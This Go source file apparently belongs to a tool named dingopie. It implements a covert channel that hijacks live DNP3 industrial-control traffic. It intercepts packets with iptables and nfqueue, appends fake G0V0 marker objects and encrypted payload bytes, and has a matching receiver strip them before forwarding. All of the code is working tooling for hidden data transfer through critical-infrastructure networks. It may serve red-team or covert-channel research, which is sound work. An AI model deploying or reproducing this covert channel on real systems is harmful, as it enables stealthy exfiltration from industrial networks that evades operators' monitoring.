//go:build !windows

// Package inject sends data on top of an existing DNP3 connection. The sender waits for outgoing or transiting
// packets, and modifies it, adding an invalid data object to mark the start of its message, and then as many bytes of
// data as can fit in the frame. On the other side, the receiver scans incoming messages for these special data
// objects, and strips them and any following data before forwarding the packet to its intended destination. The
// specific data object that is added can take one of three forms, signaling the size of data to follow, send data,
// or disconnect (all data sent). This scheme is identical regardless of the direction: both master and outstation
// append the same data objects.
//
// The sequence of messages is as follows:
//
//		(sender)-- G0V0QFA + size -->(receiver)	Initiate connection
//	Loop:
//		(sender)-- G0V0QFC + data -->(receiver)	Send Data
//		...
//	End:
//		(sender)-- G0V0QFD        -->(receiver)	Disconnect
//
// In each instance above, a legitimate DNP3 messages is coming into the sender, being modified with the extra data,
// and then being forwarded onto the receiver which strips this data. The sender and receiver can either intercept
// packets as they leave a device (i.e. running on anoutstation or master), or they can run on network infrastructure
// that carries DNP3 traffic. In the second case, dingopie inject can even multiplex its data transfer over many DNP3
// connections to increase the throughput. Although in this instance, TCP out-of-order fuckery may impact reliability.
package inject

import (
	"bytes"
	"context"
	"crypto/cipher"
	"encoding/binary"
	"fmt"
	"io"
	"math"
	"os"
	"os/signal"
	"syscall"
	"time"

	nfqueue "github.com/florianl/go-nfqueue"
	"github.com/google/gopacket"
	"github.com/nblair2/dingopie/internal"
	"github.com/nblair2/go-dnp3/v2/dnp3"
	"github.com/schollz/progressbar/v3"
)

const (
	injectRuleNumber int    = 1
	injectQueue      uint16 = 1

	dnp3HeaderLen  = 10 // 8-byte DL header + 2-byte CRC
	maxDNP3Length  = 255
	markerLen      = 3
	sizePayloadLen = 4 // big-endian uint32
)

var (
	sizeMarker   = []byte{0x00, 0x00, 0xFA}
	injectMarker = []byte{0x00, 0x00, 0xFC}
	endMarker    = []byte{0x00, 0x00, 0xFD}
)

// ==================================================================
// COMMON
// ==================================================================

type forwardInfo struct {
	payload      []byte
	responseChan chan []byte
}

func inject(
	out io.Writer,
	rule *FirewallRule,
	fwdFunc func(*forwardInfo) error,
	done chan struct{},
) error {
	sigChan := make(chan os.Signal, 1)

	signal.Notify(sigChan, syscall.SIGINT)
	defer signal.Stop(sigChan)

	err := addFirewallRule(rule)
	if err != nil {
		return fmt.Errorf("error creating firewall rule: %w", err)
	}

	defer func() {
		err := deleteFirewallRule(rule)
		if err != nil {
			fmt.Fprintf(
				out,
				"Error deleting firewall rule: %v\nRun 'iptables -F' to flush all rules\n",
				err,
			)
		}
	}()

	fmt.Fprintf(out, ">> Intercepting traffic\n")

	pktChan := make(chan forwardInfo, 1)

	go newNFQueueToChan(out, injectQueue, pktChan)
	go newChanToFunc(out, pktChan, fwdFunc)

	select {
	case <-sigChan:
	case <-done:
	}

	return nil
}

func newNFQueueToChan(out io.Writer, que uint16, forward chan forwardInfo) {
	//nolint:exhaustruct,mnd // Use defaults and maxes
	config := nfqueue.Config{
		NfQueue:      que,
		MaxPacketLen: 0xFFFF,
		MaxQueueLen:  0xFF,
		Copymode:     nfqueue.NfQnlCopyPacket,
		WriteTimeout: time.Second,
	}

	nf, err := nfqueue.Open(&config)
	if err != nil {
		return
	}

	defer nf.Close()

	fwdFunc := func(a nfqueue.Attribute) int {
		response := make(chan []byte, 1)
		fwd := forwardInfo{
			payload:      *a.Payload,
			responseChan: response,
		}

		forward <- fwd

		resp := <-response

		err = nf.SetVerdictModPacket(*a.PacketID, nfqueue.NfAccept, resp)
		if err != nil {
			fmt.Fprintf(out, "Error setting verdict: %v\n", err)
		}

		return 0
	}

	errFunc := func(_ error) int { return 1 }

	err = nf.RegisterWithErrorFunc(context.Background(), fwdFunc, errFunc)
	if err != nil {
		return
	}

	// Block until the nfqueue loop exits on error or shutdown.
	select {}
}

func newChanToFunc(out io.Writer, forward chan forwardInfo, fwdFunc func(*forwardInfo) error) {
	for fwd := range forward {
		err := fwdFunc(&fwd)
		if err != nil {
			fmt.Fprintf(out, "Error in forward function: %v\n", err)
		}

		fwd.responseChan <- fwd.payload
	}
}

// ==================================================================
// SEND
// ==================================================================

type sendState struct {
	encSize   []byte
	remaining []byte
	sizeSent  bool
	isDone    bool
	bar       *progressbar.ProgressBar
	out       io.Writer
	done      chan struct{}
}

func newSendState(out io.Writer, data []byte, key string, done chan struct{}) (*sendState, error) {
	if uint64(len(data)) > math.MaxUint32 {
		return nil, fmt.Errorf(
			"data length %d exceeds maximum of %d bytes", len(data), uint32(math.MaxUint32),
		)
	}

	//nolint:gosec // G115: len guarded by math.MaxUint32 check above
	originalLen := uint32(len(data))

	stream := internal.NewCipherStream(key)

	encSize := make([]byte, sizePayloadLen)
	binary.BigEndian.PutUint32(encSize, originalLen)
	stream.XORKeyStream(encSize, encSize)

	enc := make([]byte, len(data))
	stream.XORKeyStream(enc, data)

	bar := internal.NewProgressBar(out, int(originalLen), "\tSending:\t")

	return &sendState{
		encSize:   encSize,
		remaining: enc,
		sizeSent:  false,
		isDone:    false,
		bar:       bar,
		out:       out,
		done:      done,
	}, nil
}

func (s *sendState) process(fwd *forwardInfo) error {
	if s.isDone {
		return nil
	}

	if !s.sizeSent {
		sent, err := trySendSizePacket(fwd, s.encSize)
		if err != nil {
			return err
		}

		s.sizeSent = sent

		return nil
	}

	if len(s.remaining) > 0 {
		newPkt, consumed, err := injectIntoPacket(fwd.payload, s.remaining, injectMarker)
		if err != nil {
			return fmt.Errorf("injectIntoPacket (data): %w", err)
		}

		if consumed > 0 {
			fwd.payload = newPkt
			s.remaining = s.remaining[consumed:]
			s.bar.Add(consumed)
		}

		return nil
	}

	// All data sent — inject end marker on the next DNP3 packet with room.
	sent, err := trySendEndPacket(fwd)
	if err != nil {
		return err
	}

	if !sent {
		return nil
	}

	s.isDone = true

	s.bar.Finish()
	fmt.Fprintf(s.out, ">> All data sent, removing firewall rule\n")
	close(s.done)

	return nil
}

// ==================================================================
// RECEIVE
// ==================================================================

type recvState struct {
	stream      cipher.Stream
	gotSize     bool
	originalLen uint32
	collected   []byte
	bar         *progressbar.ProgressBar
	out         io.Writer
	done        chan struct{}
	result      *[]byte
}

func newRecvState(out io.Writer, key string, result *[]byte, done chan struct{}) *recvState {
	//nolint:exhaustruct // Use defaults
	return &recvState{
		stream: internal.NewCipherStream(key),
		out:    out,
		done:   done,
		result: result,
	}
}

func (r *recvState) process(fwd *forwardInfo) error {
	kind, payload, cleaned, err := extractFromPacket(fwd.payload)
	if err != nil {
		return fmt.Errorf("extractFromPacket: %w", err)
	}

	fwd.payload = cleaned

	switch kind { //nolint:exhaustive // markerNone is a no-op pass-through
	case markerSize:
		if len(payload) < sizePayloadLen {
			return fmt.Errorf("size marker payload too short: %d bytes", len(payload))
		}

		dec := make([]byte, sizePayloadLen)
		r.stream.XORKeyStream(dec, payload[:sizePayloadLen])
		r.originalLen = binary.BigEndian.Uint32(dec)
		r.gotSize = true
		r.bar = internal.NewProgressBar(r.out, int(r.originalLen), "\tReceiving:\t")

	case markerData:
		dec := make([]byte, len(payload))
		r.stream.XORKeyStream(dec, payload)
		r.collected = append(r.collected, dec...)

		if r.bar != nil {
			r.bar.Add(len(dec))
		}

	case markerEnd:
		received := r.collected
		//nolint:gosec // G115: len bounded by originalLen (uint32)
		if r.gotSize && uint32(len(received)) > r.originalLen {
			received = received[:r.originalLen]
		}

		*r.result = received

		if r.bar != nil {
			r.bar.Finish()
		}

		fmt.Fprintf(r.out, ">> Data receive complete, removing firewall rule\n")
		close(r.done)
	}

	return nil
}

// ==================================================================
// Exported functions
// ==================================================================

// ClientInjectReceive - dingopie client inject receive.
func ClientInjectReceive(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
) ([]byte, error) {
	var received []byte

	done := make(chan struct{})
	rule := newRecvRule(localAddr, remoteAddr, localPort, remotePort)
	recv := newRecvState(out, key, &received, done)
	err := inject(out, rule, recv.process, done)

	return received, err
}

// ServerInjectSend - dingopie server inject send.
func ServerInjectSend(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
	data []byte,
) error {
	done := make(chan struct{})

	send, err := newSendState(out, data, key, done)
	if err != nil {
		return err
	}

	rule := newSendRule(localAddr, remoteAddr, localPort, remotePort)

	return inject(out, rule, send.process, done)
}

// ClientInjectSend - dingopie client inject send.
func ClientInjectSend(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
	data []byte,
) error {
	done := make(chan struct{})

	send, err := newSendState(out, data, key, done)
	if err != nil {
		return err
	}

	rule := newSendRule(localAddr, remoteAddr, localPort, remotePort)

	return inject(out, rule, send.process, done)
}

// ServerInjectReceive - dingopie server inject receive.
func ServerInjectReceive(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
) ([]byte, error) {
	var received []byte

	done := make(chan struct{})
	rule := newRecvRule(localAddr, remoteAddr, localPort, remotePort)
	recv := newRecvState(out, key, &received, done)
	err := inject(out, rule, recv.process, done)

	return received, err
}

// ==================================================================
// Packet manipulation helpers
// ==================================================================

// injectIntoPacket appends marker+covertData to the DNP3 application payload
// within the raw IP packet. Returns the modified packet and how many covert
// bytes were consumed. Returns the original packet unchanged (consumed=0) if
// the packet is not IPv4/TCP/DNP3 or if there is no room.
func injectIntoPacket(pkt, covertData, marker []byte) ([]byte, int, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(pkt)
	if err != nil {
		return pkt, 0, nil //nolint:nilerr // non-DNP3 packets pass through silently
	}

	dnp3Start := ipHdrLen + tcpHdrLen

	frameEnd := dnp3FrameEnd(pkt, dnp3Start)
	if frameEnd < 0 {
		return pkt, 0, nil
	}

	// Use partial-decode (ignore error) so frames with unsupported objects (e.g.
	// G0/V2) can still be modified. The unsupported bytes land in appData.extra
	// and are preserved so the wire byte-count stays consistent with TCP.
	frame := dnp3.NewFrame()

	_ = frame.DecodeFromBytes(pkt[dnp3Start:frameEnd], gopacket.NilDecodeFeedback)
	if frame.Application == nil {
		return pkt, 0, nil
	}

	available := maxDNP3Length - int(frame.DataLink.Length)
	if available <= markerLen {
		return pkt, 0, nil
	}

	toSend := min(len(covertData), available-markerLen)

	appData := frame.Application.GetData()
	// Preserve any existing extra bytes (unsupported objects), then append our
	// marker so extraction can find it with bytes.Index later.
	existing := appData.GetExtra()
	newExtra := make([]byte, 0, len(existing)+markerLen+toSend)
	newExtra = append(newExtra, existing...)
	newExtra = append(newExtra, marker...)
	newExtra = append(newExtra, covertData[:toSend]...)
	appData.SetExtra(newExtra)
	frame.Application.SetData(appData)

	buf := gopacket.NewSerializeBuffer()

	err = frame.SerializeTo(buf, gopacket.SerializeOptions{})
	if err != nil {
		return pkt, 0, fmt.Errorf("SerializeTo: %w", err)
	}

	newPkt := make([]byte, dnp3Start+len(buf.Bytes()))
	copy(newPkt, pkt[:dnp3Start])
	copy(newPkt[dnp3Start:], buf.Bytes())

	rebuildChecksums(newPkt, ipHdrLen)

	return newPkt, toSend, nil
}

// markerType classifies what was found in a packet's DNP3 application payload.
type markerType int

const (
	markerNone markerType = iota
	markerSize
	markerData
	markerEnd
)

// findMarkerInExtra searches extra bytes for a covert marker and returns its type and index.
func findMarkerInExtra(extra []byte) (markerType, int) {
	if idx := bytes.Index(extra, sizeMarker); idx >= 0 {
		return markerSize, idx
	}

	if idx := bytes.Index(extra, injectMarker); idx >= 0 {
		return markerData, idx
	}

	if idx := bytes.Index(extra, endMarker); idx >= 0 {
		return markerEnd, idx
	}

	return markerNone, -1
}

// extractFromPacket scans the DNP3 application payload for a covert marker.
// Returns the marker type, bytes after the marker, and a cleaned packet with
// the marker and everything after it removed. Returns markerNone with the
// original packet if no marker is found.
func extractFromPacket(pkt []byte) (markerType, []byte, []byte, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(pkt)
	if err != nil {
		return markerNone, nil, pkt, nil //nolint:nilerr // non-DNP3 passes through
	}

	dnp3Start := ipHdrLen + tcpHdrLen

	frameEnd := dnp3FrameEnd(pkt, dnp3Start)
	if frameEnd < 0 {
		return markerNone, nil, pkt, nil
	}

	// DecodeFromBytes errors when it hits G0V0 (our marker), but Application is still set
	frame := dnp3.NewFrame()

	_ = frame.DecodeFromBytes(pkt[dnp3Start:frameEnd], gopacket.NilDecodeFeedback)
	if frame.Application == nil {
		return markerNone, nil, pkt, nil
	}

	appData := frame.Application.GetData()

	extra := appData.GetExtra()
	if len(extra) < markerLen {
		return markerNone, nil, pkt, nil
	}

	kind, markerIdx := findMarkerInExtra(extra)
	if kind == markerNone {
		return markerNone, nil, pkt, nil
	}

	payload := extra[markerIdx+markerLen:]

	// Rebuild a clean frame: preserve extra bytes that preceded the marker
	// (legitimate unsupported objects) and strip our marker and covert payload.
	appData.SetExtra(extra[:markerIdx])
	frame.Application.SetData(appData)

	buf := gopacket.NewSerializeBuffer()

	err = frame.SerializeTo(buf, gopacket.SerializeOptions{})
	if err != nil {
		return markerNone, nil, pkt, fmt.Errorf("SerializeTo: %w", err)
	}

	cleanPkt := make([]byte, dnp3Start+len(buf.Bytes()))
	copy(cleanPkt, pkt[:dnp3Start])
	copy(cleanPkt[dnp3Start:], buf.Bytes())

	rebuildChecksums(cleanPkt, ipHdrLen)

	return kind, payload, cleanPkt, nil
}

// trySendSizePacket attempts to inject the encrypted size into fwd. Returns true if injected,
// false if the packet has no room yet or is not DNP3.
func trySendSizePacket(fwd *forwardInfo, encSize []byte) (bool, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(fwd.payload)
	if err != nil {
		return false, nil //nolint:nilerr // non-DNP3 packets pass through silently
	}

	dnp3Start := ipHdrLen + tcpHdrLen
	if len(fwd.payload) < dnp3Start+3 {
		return false, nil
	}

	available := maxDNP3Length - int(fwd.payload[dnp3Start+2])
	if available < markerLen+sizePayloadLen {
		return false, nil // not enough room, wait for next packet
	}

	newPkt, consumed, err := injectIntoPacket(fwd.payload, encSize, sizeMarker)
	if err != nil {
		return false, fmt.Errorf("injectIntoPacket (size): %w", err)
	}

	if consumed == 0 {
		return false, nil // injection failed (e.g. no room), retry next packet
	}

	fwd.payload = newPkt

	return true, nil
}

// trySendEndPacket attempts to inject the end marker into fwd. Returns true if injected,
// false if the packet has no room or is not DNP3.
func trySendEndPacket(fwd *forwardInfo) (bool, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(fwd.payload)
	if err != nil {
		return false, nil //nolint:nilerr // non-DNP3 packets pass through silently
	}

	dnp3Start := ipHdrLen + tcpHdrLen
	if len(fwd.payload) < dnp3Start+dnp3HeaderLen {
		return false, nil
	}

	available := maxDNP3Length - int(fwd.payload[dnp3Start+2])
	if available <= markerLen {
		return false, nil // not enough room, wait for next packet
	}

	newPkt, _, err := injectIntoPacket(fwd.payload, nil, endMarker)
	if err != nil {
		return false, fmt.Errorf("injectIntoPacket (end): %w", err)
	}

	if len(newPkt) <= len(fwd.payload) {
		return false, nil // nothing injected, retry next packet
	}

	fwd.payload = newPkt

	return true, nil
}
